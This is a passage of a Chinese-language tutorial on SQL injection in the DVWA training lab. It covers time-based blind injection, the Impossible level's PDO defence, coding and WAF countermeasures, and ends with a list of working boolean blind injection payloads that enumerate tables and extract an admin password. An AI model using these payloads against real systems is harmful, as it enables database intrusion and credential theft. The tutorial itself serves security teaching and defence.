<h4 id="方法4：时间盲注（不受LIMIT影响）"><a href="#方法4：时间盲注（不受LIMIT影响）" class="headerlink" title="方法4：时间盲注（不受LIMIT影响）"></a>方法4：时间盲注（不受LIMIT影响）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 时间盲注不受LIMIT限制</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SLEEP(5) --</span></span><br><span class="line"><span class="string">响应慢 → 注入成功</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 提取数据</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> IF((<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="string">&#x27;d&#x27;</span>, SLEEP(<span class="number">3</span>), <span class="number">0</span>) <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用PDO预编译语句，真正安全。</p>
<h3 id="后端代码分析-3"><a href="#后端代码分析-3" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进1：验证Anti-CSRF token ★★★</span></span><br><span class="line">    <span class="comment">// checkToken() - 验证CSRF token</span></span><br><span class="line">    <span class="comment">// 防止跨站请求伪造</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户输入</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进2：输入验证 ★★★</span></span><br><span class="line">    <span class="comment">// is_numeric() - 检查是否为数字</span></span><br><span class="line">    <span class="comment">// 如果不是数字，直接拒绝</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 这是白名单验证：只接受数字</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$id</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 核心防护：PDO预编译语句 ★★★</span></span><br><span class="line">        <span class="comment">// $db - PDO数据库连接对象</span></span><br><span class="line">        <span class="comment">// prepare() - 准备SQL语句</span></span><br><span class="line">        <span class="comment">// :id - 命名参数占位符</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// 原理：</span></span><br><span class="line">        <span class="comment">// 1. SQL结构和数据完全分离</span></span><br><span class="line">        <span class="comment">// 2. 参数永远不会被当作SQL代码执行</span></span><br><span class="line">        <span class="comment">// 3. 数据库引擎知道:id是数据，不是代码</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 绑定参数 ★★★</span></span><br><span class="line">        <span class="comment">// bindParam() - 将变量绑定到参数</span></span><br><span class="line">        <span class="comment">// PDO::PARAM_INT - 参数类型为整数</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// 作用：</span></span><br><span class="line">        <span class="comment">// 1. 明确指定参数类型</span></span><br><span class="line">        <span class="comment">// 2. 防止类型混淆攻击</span></span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::<span class="variable constant_">PARAM_INT</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 执行查询 ★★★</span></span><br><span class="line">        <span class="comment">// execute() - 执行预编译语句</span></span><br><span class="line">        <span class="comment">// 此时才真正执行SQL</span></span><br><span class="line">        <span class="comment">// 参数值被安全地插入</span></span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 获取结果 ★★★</span></span><br><span class="line">        <span class="comment">// fetch() - 获取一行结果</span></span><br><span class="line">        <span class="comment">// 如果没有结果，返回false</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// ★★★ 改进3：显示具体数据 ★★★</span></span><br><span class="line">            <span class="comment">// 因为已经完全安全，可以显示数据</span></span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;First name: &#x27;</span> . <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Surname: &#x27;</span> . <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ★★★ 输入不是数字，直接拒绝 ★★★</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Invalid input: must be numeric&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 生成新的CSRF token ★★★</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><p><strong>多层防御：</strong></p>
<ol>
<li><strong>CSRF Token</strong> - 防止跨站请求伪造</li>
<li><strong>输入验证</strong> - is_numeric()白名单</li>
<li><strong>PDO预编译</strong> - SQL结构和数据分离</li>
<li><strong>参数类型绑定</strong> - PDO::PARAM_INT</li>
<li><strong>LIMIT限制</strong> - 防止返回过多数据</li>
</ol>
<p><strong>PDO预编译工作原理：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">传统拼接（不安全）:</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE id = &#x27;<span class="variable">$id</span>&#x27;&quot;</span>;</span><br><span class="line">↓</span><br><span class="line">攻击：<span class="variable">$id</span> = <span class="string">&quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">↓</span><br><span class="line">结果：SELECT * FROM <span class="built_in">users</span> WHERE <span class="built_in">id</span> = <span class="string">&#x27;1&#x27;</span> OR <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">↓</span><br><span class="line">SQL注入成功！</span><br><span class="line"></span><br><span class="line">PDO预编译（安全）:</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;prepare(<span class="string">&quot;SELECT * FROM users WHERE id = :id&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;bindParam(<span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::PARAM_INT);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">↓</span><br><span class="line">攻击：<span class="variable">$id</span> = <span class="string">&quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">↓</span><br><span class="line">PDO处理：将<span class="string">&quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span>作为整数0</span><br><span class="line">或拒绝（不是有效整数）</span><br><span class="line">↓</span><br><span class="line">SQL注入失败！</span><br></pre></td></tr></table></figure>

<h3 id="为什么无法攻破？"><a href="#为什么无法攻破？" class="headerlink" title="为什么无法攻破？"></a>为什么无法攻破？</h3><p><strong>所有攻击都被阻止：</strong></p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">攻击<span class="number">1</span>：<span class="number">1</span><span class="string">&#x27; OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="function"><span class="title">is_numeric</span>() → <span class="variable"><span class="literal">False</span></span> → 拒绝</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">攻击<span class="number">2</span>：<span class="number">1</span> <span class="variable"><span class="keyword">OR</span></span> <span class="number">1</span>=<span class="number">1</span></span></span><br><span class="line"><span class="function"><span class="title">is_numeric</span>() → <span class="variable"><span class="literal">False</span></span> → 拒绝（包含空格）</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">攻击<span class="number">3</span>：<span class="number">1</span></span></span><br><span class="line"><span class="function"><span class="title">is_numeric</span>() → <span class="variable"><span class="literal">True</span></span></span></span><br><span class="line"><span class="function"><span class="variable">PDO</span> → 安全执行</span></span><br><span class="line"><span class="function">结果：正常查询，无法注入</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">攻击<span class="number">4</span>：<span class="number">1</span>; <span class="variable">DROP</span> <span class="variable">TABLE</span> <span class="variable">users</span>; --</span></span><br><span class="line"><span class="function"><span class="title">is_numeric</span>() → <span class="variable"><span class="literal">False</span></span> → 拒绝</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">攻击<span class="number">5</span>：使用十六进制/<span class="variable">Unicode</span>绕过</span></span><br><span class="line"><span class="function"><span class="title">is_numeric</span>() → <span class="variable"><span class="literal">False</span></span> → 拒绝</span></span><br></pre></td></tr></table></figure>

<p><strong>关键防御点：</strong></p>
<ol>
<li><strong>白名单验证</strong> - 只接受数字</li>
<li><strong>预编译语句</strong> - SQL结构固定</li>
<li><strong>参数绑定</strong> - 类型强制转换</li>
<li><strong>双重保护</strong> - 验证 + PDO</li>
</ol>
<hr>
<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h3><h4 id="1-使用PDO预编译（最佳方案）"><a href="#1-使用PDO预编译（最佳方案）" class="headerlink" title="1. 使用PDO预编译（最佳方案）"></a>1. 使用PDO预编译（最佳方案）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ✅ 正确：PDO预编译</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users WHERE id = :id&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或使用execute()直接传递参数</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users WHERE id = ?&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$id</span>]);</span><br></pre></td></tr></table></figure>

<h4 id="2-输入验证和白名单"><a href="#2-输入验证和白名单" class="headerlink" title="2. 输入验证和白名单"></a>2. 输入验证和白名单</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 验证数字</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$id</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid input&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证字符串（白名单）</span></span><br><span class="line"><span class="variable">$allowed</span> = [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$input</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid input&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正则验证</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid characters&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-最小权限原则"><a href="#3-最小权限原则" class="headerlink" title="3. 最小权限原则"></a>3. 最小权限原则</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数据库用户只有SELECT权限</span></span><br><span class="line"><span class="comment">// 即使被注入，也无法DELETE/UPDATE/DROP</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// config.php</span></span><br><span class="line"><span class="variable">$db_user</span> = <span class="string">&#x27;read_only_user&#x27;</span>; <span class="comment">// 只读用户</span></span><br><span class="line"><span class="variable">$db_pass</span> = <span class="string">&#x27;secure_password&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 授权（在MySQL中）</span></span><br><span class="line">GRANT SELECT ON database.* TO <span class="string">&#x27;read_only_user&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="4-错误处理"><a href="#4-错误处理" class="headerlink" title="4. 错误处理"></a>4. 错误处理</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ❌ 不要显示数据库错误</span></span><br><span class="line"><span class="comment">// die(mysql_error());</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 记录错误到日志</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">error_log</span>(<span class="string">&#x27;Database error: &#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;An error occurred&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="检测层面"><a href="#检测层面" class="headerlink" title="检测层面"></a>检测层面</h3><h4 id="1-WAF规则"><a href="#1-WAF规则" class="headerlink" title="1. WAF规则"></a>1. WAF规则</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ModSecurity规则示例</span></span><br><span class="line"><span class="attribute">SecRule</span> ARGS <span class="string">&quot;<span class="variable">@detectSQLi</span>&quot;</span> \</span><br><span class="line">    <span class="string">&quot;id:1000,phase:2,block,msg:&#x27;SQL Injection Detected&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检测常见SQL注入模式</span></span><br><span class="line">SecRule ARGS <span class="string">&quot;<span class="variable">@rx</span> (union|select|insert|update|delete|drop|exec|script)&quot;</span> \</span><br><span class="line">    <span class="string">&quot;id:1001,phase:2,block,msg:&#x27;SQL Keyword Detected&#x27;&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="2-监控异常查询"><a href="#2-监控异常查询" class="headerlink" title="2. 监控异常查询"></a>2. 监控异常查询</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 记录慢查询</span></span><br><span class="line"><span class="variable">$start</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$duration</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>) - <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$duration</span> &gt; <span class="number">1.0</span>) &#123;</span><br><span class="line">    <span class="comment">// 查询超过1秒，可能是时间盲注</span></span><br><span class="line">    <span class="title function_ invoke__">logSecurityEvent</span>(<span class="string">&#x27;Slow query detected&#x27;</span>, [</span><br><span class="line">        <span class="string">&#x27;duration&#x27;</span> =&gt; <span class="variable">$duration</span>,</span><br><span class="line">        <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;query&#x27;</span> =&gt; <span class="variable">$query</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-限流和账户锁定"><a href="#3-限流和账户锁定" class="headerlink" title="3. 限流和账户锁定"></a>3. 限流和账户锁定</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检测暴力破解</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkAttempts</span>(<span class="params"><span class="variable">$ip</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$attempts</span> = <span class="title function_ invoke__">getAttempts</span>(<span class="variable">$ip</span>, <span class="number">60</span>); <span class="comment">// 过去60秒</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$attempts</span> &gt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="comment">// 锁定IP 5分钟</span></span><br><span class="line">        <span class="title function_ invoke__">lockIP</span>(<span class="variable">$ip</span>, <span class="number">300</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Too many attempts&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">recordAttempt</span>(<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="SQLMap防御测试"><a href="#SQLMap防御测试" class="headerlink" title="SQLMap防御测试"></a>SQLMap防御测试</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试自己的应用</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://your-site.com/page?id=1&quot;</span> \</span><br><span class="line">       --batch \</span><br><span class="line">       --level=5 \</span><br><span class="line">       --risk=3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果SQLMap无法注入，说明防护有效</span></span><br></pre></td></tr></table></figure>

<h4 id="代码审计工具"><a href="#代码审计工具" class="headerlink" title="代码审计工具"></a>代码审计工具</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用PHPStan检查SQL注入</span></span><br><span class="line">phpstan analyze src/ --level=8</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用SonarQube</span></span><br><span class="line">sonar-scanner \</span><br><span class="line">    -Dsonar.projectKey=myproject \</span><br><span class="line">    -Dsonar.sources=src</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
<thead>
<tr>
<th>特性</th>
<th>Low</th>
<th>Medium</th>
<th>High</th>
<th>Impossible</th>
</tr>
</thead>
<tbody><tr>
<td>查询方式</td>
<td>字符串拼接</td>
<td>mysqli_escape</td>
<td>mysqli_escape</td>
<td>PDO预编译</td>
</tr>
<tr>
<td>参数传递</td>
<td>GET</td>
<td>POST</td>
<td>Cookie</td>
<td>GET</td>
</tr>
<tr>
<td>输入验证</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
<td>✅ is_numeric</td>
</tr>
<tr>
<td>错误信息</td>
<td>✅ 显示</td>
<td>❌ 隐藏</td>
<td>❌ 隐藏</td>
<td>❌ 隐藏</td>
</tr>
<tr>
<td>限流</td>
<td>❌</td>
<td>❌</td>
<td>✅ 弱限流</td>
<td>✅ CSRF</td>
</tr>
<tr>
<td>LIMIT</td>
<td>❌</td>
<td>❌</td>
<td>✅ LIMIT 1</td>
<td>✅ LIMIT 1</td>
</tr>
<tr>
<td>攻击难度</td>
<td>极易</td>
<td>简单</td>
<td>中等</td>
<td>极难</td>
</tr>
<tr>
<td>布尔盲注</td>
<td>✅ 可行</td>
<td>✅ 可行</td>
<td>✅ 可行</td>
<td>❌ 不可行</td>
</tr>
<tr>
<td>时间盲注</td>
<td>✅ 可行</td>
<td>✅ 可行</td>
<td>✅ 可行</td>
<td>❌ 不可行</td>
</tr>
</tbody></table>
<hr>
<h2 id="常用Payload集合"><a href="#常用Payload集合" class="headerlink" title="常用Payload集合"></a>常用Payload集合</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基础测试</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND 1=1 --        → True</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--        → False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 数据库信息</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND LENGTH(database())&gt;5 --</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="built_in">SUBSTRING</span>(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;d&#x27;</span> <span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND ASCII(SUBSTRING(database(),1,1))&gt;100 --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 表名枚举</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>database())<span class="operator">&gt;</span><span class="number">5</span> <span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)=&#x27;</span>u<span class="string">&#x27; --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 数据提取</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;5&#x27;</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>

